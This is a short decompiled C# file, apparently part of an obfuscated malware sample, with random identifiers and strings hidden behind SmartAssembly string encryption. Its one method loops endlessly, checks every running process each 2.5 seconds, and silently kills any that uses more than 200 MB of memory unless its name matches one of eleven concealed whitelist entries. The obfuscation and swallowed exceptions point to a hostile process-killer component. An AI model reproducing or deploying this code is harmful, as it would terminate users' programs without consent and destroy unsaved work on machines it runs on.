using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace UmXkJLRjSLdPF;

public static class RcstiZgfVt
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void QPtKcdHyfdXf()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107364953)) && !process.ProcessName.Contains(getString_0(107364912)) && !process.ProcessName.Contains(getString_0(107364903)) && !process.ProcessName.Contains(getString_0(107364926)) && !process.ProcessName.Contains(getString_0(107364881)) && !process.ProcessName.Contains(getString_0(107364900)) && !process.ProcessName.Contains(getString_0(107364887)) && !process.ProcessName.Contains(getString_0(107462634)) && !process.ProcessName.Contains(getString_0(107462653)) && !process.ProcessName.Contains(getString_0(107462608)) && !process.ProcessName.Contains(getString_0(107462619)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static RcstiZgfVt()
	{
		Strings.CreateGetStringDelegate(typeof(RcstiZgfVt));
	}
}
